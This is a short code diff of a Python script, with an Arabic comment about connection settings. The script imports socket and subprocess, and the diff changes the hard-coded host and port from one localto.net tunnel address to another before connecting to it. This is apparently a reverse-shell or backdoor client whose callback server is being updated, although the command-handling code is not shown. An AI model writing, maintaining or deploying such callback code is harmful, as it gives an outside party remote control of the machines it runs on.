@@ -3,8 +3,8 @@ import subprocess
 import os
 
 # إعداد معلومات الاتصال
-HOST = 'dmicdg1.localto.net'
-PORT = 4152
+HOST = 'g9cowka.localto.net'
+PORT = 7723
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((HOST, PORT))
 
